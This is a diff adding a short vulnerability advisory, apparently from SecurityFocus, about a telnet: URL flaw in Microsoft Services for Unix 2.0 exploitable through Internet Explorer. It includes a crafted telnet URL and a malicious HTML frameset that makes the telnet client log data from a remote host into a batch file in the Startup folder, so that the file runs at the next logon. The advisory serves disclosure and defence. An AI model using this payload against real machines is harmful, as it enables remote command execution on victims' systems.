@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/2463/info
+
+Services for Unix 2.0 contains a client side logging option which records all information exchanged in a telnet session. A vulnerability exists that could enable a remote user to invoke the telnet client and execute arbitrary commands on a target machine via IE. This is achieved by crafting a URL composed of command line parameters to the telnet client, which would invoke 'telnet.exe'. Telnet would connect to the host and initate the logging of session information, access to this file will allow an attacker to write and execute arbitrary commands which may be executed later. 
+
+The following URL will cause IE to connect to the host and initiate the logging function:
+
+telnet:-f%20\file.txt%20host
+
+The following is an example of a malicious HTML message which could cause data that is received from the destination port on the host "host" to be written to the file "filename" in the startup directory for all users. If the logged in user has the appropriate permissions, a batch file will be created and executed upon future authentication.
+
+<html>
+<frameset rows="100%,*">
+<frame src=about:blank>
+<frame src=telnet:-f%20\Documents%20and%Settings\All%20Users
+\start%20menu\programs\startup\start.bat%20host%208000>
+</frameset>
+</html> 
